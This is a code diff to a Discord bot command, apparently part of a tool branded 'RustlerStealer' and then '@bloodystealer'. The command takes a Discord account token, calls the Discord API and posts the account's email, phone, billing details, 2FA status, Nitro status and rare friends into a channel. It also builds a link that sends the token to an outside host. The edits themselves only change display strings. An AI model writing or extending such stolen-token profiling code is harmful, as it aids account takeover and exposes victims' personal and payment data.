@@ -3,7 +3,7 @@ const axios = require("axios")
 
 module.exports.run = async (bot, message, args) => {
   let token = args[0];
-  if (!token) return message.channel.send(`Invalid arguments! Use: ${bot.config.prefix}info <token>`);
+  if (!token) return message.channel.send(`Invalid argument! Use: ${bot.config.prefix}info <token>`);
   let json;
   await axios.get("https://discord.com/api/v9/users/@me", {
       headers: {
@@ -89,7 +89,7 @@ async function getRelationships(token) {
             gay += `${b} - \`${z.user.username}#${z.user.discriminator}\`\n`
         }
     }
-    if (gay == '') gay = "*No Rare Friends*"
+    if (gay == '') gay = "*No rare friends.*"
     return {
         length: r.length,
         frien: gay
@@ -225,23 +225,23 @@ function getUserNitro(flags) {
         case 2:
             return "\`Nitro Boost\`";
         default:
-            return "\`No Nitro\`";
+            return "\`Sem nitro\`";
     };
 }
 
   var billing = await getBilling(token);
   const info = new Discord.MessageEmbed()
-  .setDescription(`<:sudry:978378846346813562> **Token:**\n\`${token}\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`)
+  .setDescription(`<:sudry:978378846346813562> **Token:**\n\`${token}\`\n[Copy token](https://superfurrycdn.nl/copy/${token})`)
   .addField("<:sudry:978378846858539068> Badges:", `${getBadges(json.flags)} ${await getNitro(json.premium_type, json.id, token)}`)
   .addField("<:sudry:978378846808203274> Nitro Type:", `${getUserNitro(json.premium_type)}`)
   .addField("<:sudry:978378847487660092> Billing:", `${billing}`)
-  .addField("<:sudry:978378846611075072> Phone:", `\`${json.phone || "No Phone"}\``)
+  .addField("<:sudry:978378846611075072> Phone:", `\`${json.phone || "No phone"}\``)
   .addField("<:sudry:978378846632046652> Email:", `\`${json.email}\``)
   .addField("<:sudry:978378846476836865> 2FA Enabled:", `\`${json.mfa_enabled ? "Yes" : "No"}\``)
   .setAuthor(`${json.username}#${json.discriminator} (${json.id})`, "https://c.tenor.com/T3So8nwWyDkAAAAC/grunge-girl-aesthetic.gif")
   .setImage(`https://cdn.discordapp.com/banners/${json.id}/${json.banner}?size=512`)
   .setThumbnail(`https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`)
-  .setFooter("RustlerStealer")
+  .setFooter("@bloodystealer")
   .setColor("2f3136")
   message.channel.send(info)
   }
